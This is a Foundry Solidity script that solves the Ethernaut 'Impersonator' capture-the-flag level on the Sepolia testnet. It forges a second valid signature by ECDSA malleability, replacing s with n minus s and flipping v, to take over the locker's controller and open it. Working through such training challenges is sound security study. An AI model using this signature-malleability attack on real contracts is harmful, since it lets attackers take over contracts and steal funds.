// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0 <=0.9.0;

import { console } from "@dev/forge-std/console.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { EthernautScript } from "./00_Ethernaut.s.sol";
import { Impersonator, ECLocker } from "contracts/CTF/Ethernaut/32_Impersonator.sol";
/*
forge script \
  foundry/script/CTF/Ethernaut/32_Impersonator.s.sol:ImpersonatorAttack \
  -f sepolia -vvvv \
  --broadcast

https://eips.ethereum.org/EIPS/eip-191
https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm
https://en.bitcoin.it/wiki/Secp256k1
https://cryptobook.nakov.com/digital-signatures/ecdsa-sign-verify-messages

https://app.blocksec.com/explorer/tx/sepolia/0x241bb7c02bb3458fdc8c527d7e1f09ac9fdfc56c46aaa0b57c37ab105b321fe7?line=6
https://dashboard.tenderly.co/tx/sepolia/0x241bb7c02bb3458fdc8c527d7e1f09ac9fdfc56c46aaa0b57c37ab105b321fe7?trace=0.7.2.8


cast to-dec 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91
cast to-dec 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2
cast to-dec 0x0cdccf90769e3a4ec77cb11a07f213e0ab1889d8821b903c08351e0ecd486a32
cast to-dec 1b
cast to-int256   115_792_089_237_316_195_423_570_985_008_687_907_852_837_564_279_074_904_382_605_163_141_518_161_494_337

cast abi-encode "(string,uint256)" "(1,1)"



deployed signature

v = 27
r = 11397568185806560130291530949248708355673262872727946990834312389557386886033
s = 54405834204020870944342294544757609285398723182661749830189277079337680158706



*/

contract ImpersonatorAttack is EthernautScript {
    Impersonator private victimInst;

    function run() public broadcast {
        // 1.Setup
        console.log("Impersonator Before Attack player:", player);
        victimInst = Impersonator(0x7dCeaF88F7369D9f7D026988a34713358df0578a);
        ECLocker locker = victimInst.lockers(0);
        console.log("Impersonator Before Attack locker.controller():", locker.controller());
        // 2.Attack
        // ...
        bytes32 r = bytes32(
            uint256(
                11_397_568_185_806_560_130_291_530_949_248_708_355_673_262_872_727_946_990_834_312_389_557_386_886_033
            )
        );
        bytes32 s = bytes32(
            uint256(
                54_405_834_204_020_870_944_342_294_544_757_609_285_398_723_182_661_749_830_189_277_079_337_680_158_706
            )
        );

        // Fp https://en.bitcoin.it/wiki/Secp256k1
        uint256 secp256k1_n =
            115_792_089_237_316_195_423_570_985_008_687_907_852_837_564_279_074_904_382_605_163_141_518_161_494_337;
        // console.log(secp256k1_n);
        // 115792089237316195423570985008687907852837564279074904382605163141518161494337
        // 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141
        bytes32 tricked_s = bytes32(secp256k1_n - uint256(s));
        locker.changeController(28, r, tricked_s, address(0));
        locker.open(0, 0, 0);
        // 3Check
        // ...
        console.log("Impersonator Before Attack locker.controller():", locker.controller());
    }
}
